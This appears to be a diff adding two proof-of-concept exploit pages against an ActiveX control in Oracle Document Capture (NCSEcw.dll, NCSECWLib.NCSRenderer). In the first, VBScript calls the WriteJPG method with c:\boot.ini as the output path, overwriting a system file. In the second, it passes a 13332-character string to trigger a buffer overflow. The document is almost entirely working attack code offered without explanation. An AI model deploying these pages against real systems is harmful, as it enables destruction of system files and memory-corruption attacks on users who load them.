@@ -1,0 +1,40 @@
+Example 1 (file overwrite)
+******* 
+
+
+<html>
+<script>
+targetFile = "C:\Program Files\Oracle\Document Capture\NCSEcw.dll"
+prototype  = "Sub WriteJPG ( ByVal OutputFile As String ,  ByVal Quality As Long ,  ByVal bWriteWorldFile As Boolean )"
+memberName = "WriteJPG"
+progid     = "NCSECWLib.NCSRenderer"
+argCount   = 3
+
+arg1="c:\boot.ini"
+arg2=1
+arg3=True
+
+target.WriteJPG arg1 ,arg2 ,arg3 
+
+</script>
+</html>
+
+
+Example 2
+*******
+
+<html>
+<script>
+targetFile = "C:\Program Files\Oracle\Document Capture\NCSEcw.dll"
+prototype  = "Sub WriteJPG ( ByVal OutputFile As String ,  ByVal Quality As Long ,  ByVal bWriteWorldFile As Boolean )"
+memberName = "WriteJPG"
+progid     = "NCSECWLib.NCSRenderer"
+argCount   = 3
+
+arg1=String(13332, "A")
+arg2=1
+arg3=True
+
+target.WriteJPG arg1 ,arg2 ,arg3 
+
+</script></job></package>
